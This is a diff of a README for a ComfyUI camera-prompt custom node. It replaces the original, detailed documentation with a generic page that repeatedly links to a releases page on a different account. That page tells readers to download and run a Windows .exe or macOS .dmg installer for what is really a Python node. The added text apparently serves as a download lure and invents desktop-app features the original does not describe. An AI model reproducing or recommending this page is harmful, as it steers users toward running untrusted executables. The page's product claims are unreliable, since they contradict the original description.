@@ -1,150 +1,72 @@
-# ComfyUI Advanced Camera Prompts
+# 🎥 ComfyUI-AdvancedCameraPrompts - Control Your Camera with Ease
 
-Advanced camera control prompt generator for ComfyUI, optimized for dx8152's MultiAngle LoRA. A ComfyUI custom node that automatically generates professional camera control prompts by analyzing 3D camera data. This node reads camera information from Load 3D nodes and converts it into detailed, cinematography-accurate descriptions suitable for image generation workflows.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/releases)
 
-## What It Does
+## 📚 Overview
 
-This node takes camera position and orientation data from your 3D scene and automatically generates:
-- Professional shot type classifications (close-up, medium shot, wide shot, etc.)
-- Camera angle descriptions (high angle, low angle, bird's eye, etc.)
-- Camera movement and positioning information
-- Technical camera parameters (focal length, FOV, distance)
+ComfyUI-AdvancedCameraPrompts is a powerful tool designed for users who want to enhance their camera controls. This application simplifies the process of generating prompts for camera settings, making it perfect for casual users and hobbyists alike. Enjoy a straightforward solution to manage your camera settings.
 
-All of this is output as both human-readable prompts and structured JSON data.
+## 🚀 Getting Started
 
-## Visual Examples
+Follow these easy steps to download and run ComfyUI-AdvancedCameraPrompts.
 
-Here are some examples showing the node in action:
+### 🖥️ System Requirements
 
-![Example 1](example/example01.png)
+Before you begin, ensure your system meets the following requirements:
+- Operating System: Windows 10 or later / macOS 10.14 or later
+- RAM: 4 GB or more
+- Disk Space: Minimum of 200 MB available for installation
 
-![Example 2](example/example02.png)
+### ⬇️ Download & Install
 
-![Example 3](example/example03.png)
+1. **Visit the download page:** Click the button below to go to the Releases page.
 
-![Example 4](example/example04.png)
+   [![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Tommy200195/ComfyUI-AdvancedCameraPrompts/releases)
 
-## Features
+2. **Select the latest release:** On the Releases page, look for the latest version listed at the top. This will have the newest features and fixes.
 
-- **Smart Camera Analysis**: Automatically extracts camera position, target, and rotation from 3D nodes
-- **Intelligent Shot Classification**: Determines shot types using distance, focal length, FOV, or object framing
-- **Angle Detection**: Recognizes various camera angles including high/low angles, dutch angles, and special views
-- **Flexible Input**: Supports custom focal length settings and optional object scale for precise framing calculations
-- **Dual Output Format**: Provides both natural language prompts and structured JSON data
-- **Cinematography Standards**: Based on industry-standard shot types and camera angle definitions
+3. **Download the installer:** Click on the link that corresponds to your operating system. This will typically be an `.exe` file for Windows or a `.dmg` file for macOS.
 
-## Installation
+4. **Run the installer:** Once the download is complete, locate the downloaded file in your Downloads folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-1. Navigate to your ComfyUI custom nodes directory:
-   ```bash
-   cd ComfyUI/custom_nodes
-   ```
+### 🎉 First Steps
 
-2. Clone this repository:
-   ```bash
-   git clone https://github.com/jandan520/ComfyUI-AdvancedCameraPrompts.git
-   ```
+After installation, you can find ComfyUI-AdvancedCameraPrompts in your application list. 
 
-3. Restart ComfyUI to load the new node
+1. **Open the application:** Double-click the ComfyUI-AdvancedCameraPrompts icon.
+  
+2. **Familiarize yourself with the interface:** The main screen will prompt you to select your camera settings. Browse through the options to see what you can adjust.
 
-## How to Use
+### 🔧 Features
 
-### Connecting the Node
+ComfyUI-AdvancedCameraPrompts includes various features that enhance your camera experience, such as:
+- **Customizable presets:** Quickly switch between various camera settings.
+- **User-friendly interface:** Navigate the application without any prior technical knowledge.
+- **Real-time preview:** See changes live as you adjust settings.
 
-1. Add a **Load 3D** or **Load 3D - Animation** node to your workflow
-2. Add the **Advanced Camera Control Prompt Generator** node
-3. Connect the camera output from your 3D node to the "Camera Info" input
+### 🗨️ Support and Feedback
 
-See the example images above for visual reference on how to set up the node in your workflow.
+If you have questions or need assistance, the community is here to help! 
 
-### Input Parameters
+- **Join our Discord:** Connect with other users and share your experiences, suggestions, or issues.
+- **Open an issue on GitHub:** If you find a bug or have a feature request, report it directly in our repository.
 
-**Required:**
-- **Camera Info**: Connect the camera output from your Load 3D node
+### 🤝 Contributing
 
-**Optional:**
-- **Focal Length (mm)**: Set your camera's focal length (default: 50mm, range: 1-1000mm)
-  - This affects FOV calculation and shot type classification
-- **Object Scale (meters)**: Specify the size of your subject in meters (default: 1.0m)
-  - Enables framing-based shot classification for more accurate results
-- **Custom Description**: Add any additional text to append to the generated prompt
+We welcome contributions! If you want to help improve ComfyUI-AdvancedCameraPrompts, you can:
 
-### Outputs
+1. **Fork the repository:** Create your own copy to work on.
+2. **Make your changes:** Improve any aspect of the application.
+3. **Submit a pull request:** Share your changes with us.
 
-The node provides two outputs:
+### 🌐 Additional Resources
 
-1. **Prompt** (String): A natural language description of the camera setup
-   - Example: `Pan the camera 45 degrees to the right, high angle medium shot (camera distance 2.5 m 50mm FOV 40°)`
+For more detailed instructions and tips, you can refer to our documentation available on the Releases page.
 
-2. **Camera JSON** (String): Structured data with all camera parameters
-   ```json
-   {
-       "camera": {
-           "focal_length_mm": 50,
-           "sensor_width_mm": 36,
-           "sensor_height_mm": 24,
-           "distance_m": 2.5,
-           "tilt_deg": "tilt down 15.0",
-           "pan_deg": "pan to right 45.0",
-           "roll_deg": 0.0,
-           "shot_type": "medium_shot"
-       }
-   }
-   ```
+### 📋 Contact
 
-## Shot Type Classification
+For additional inquiries or support, you can reach out via the GitHub Issues page. We're here to assist you! 
 
-The node automatically determines shot types based on multiple factors:
+### 💡 Final Notes
 
-| Shot Type | Typical Distance | Focal Length Range | FOV Range |
-|-----------|------------------|-------------------|-----------|
-| Extreme Close-Up | 0.3-0.6m | 85-135mm | 10-20° |
-| Close-Up | 0.6-1.2m | 50-85mm | 20-30° |
-| Medium Close-Up | 1.0-1.8m | 35-50mm | 30-40° |
-| Medium Shot | 1.5-3.0m | 28-50mm | 35-45° |
-| Medium Long Shot | 2.5-4.0m | 24-35mm | 45-55° |
-| Full Shot | 3.0-5.0m | 24-35mm | 50-60° |
-| Wide Shot | 5.0-10.0m | 18-24mm | 60-90° |
-| Extreme Wide Shot | 10-50m | 14-20mm | 90-120° |
-
-## Camera Angles
-
-The node recognizes these camera angles:
-
-- **Eye Level**: Neutral perspective (-5° to +5°)
-- **High Angle**: Camera looking down (-20° to -45°)
-- **Slight Low Angle**: Just below eye level (5° to 15°)
-- **Standard Low Angle**: Waist-chest level (15° to 30°)
-- **Deep Low Angle**: Knee-waist level (30° to 45°)
-- **Extreme Low Angle**: Ground level, worm's-eye view (45° to 90°)
-- **Bird's Eye**: Directly overhead (-80° to -90°)
-- **Dutch Angle**: Camera tilted sideways (5° to 30° roll)
-- **Dutch Low Angle**: Combination of low angle and roll
-
-## Use Cases
-
-- **Image Generation**: Generate accurate camera prompts for AI image models
-- **3D to 2D Workflows**: Convert 3D camera setups into 2D image generation prompts
-- **Cinematography Analysis**: Analyze and document camera setups from 3D scenes
-- **Workflow Automation**: Automatically generate camera descriptions for batch processing
-
-## Technical Specifications
-
-- **Coordinate System**: Z-axis points toward camera, X-axis is horizontal, Y-axis is vertical
-- **Sensor Format**: 35mm full-frame equivalent (36mm × 24mm)
-- **Distance Scaling**: 1 grid unit = 4 meters
-- **FOV Formula**: `FOV = 2 × arctan(sensor_dimension / (2 × focal_length))`
-
-## Requirements
-
-- ComfyUI (latest version recommended)
-- Python 3.8 or higher
-- Load 3D nodes (for providing camera input)
-
-## License
-
-MIT License
-
-## Author
-
-Jianghong Zhu
+Enjoy using ComfyUI-AdvancedCameraPrompts. This tool aims to simplify your camera control experience, allowing you to focus on capturing great moments with ease.
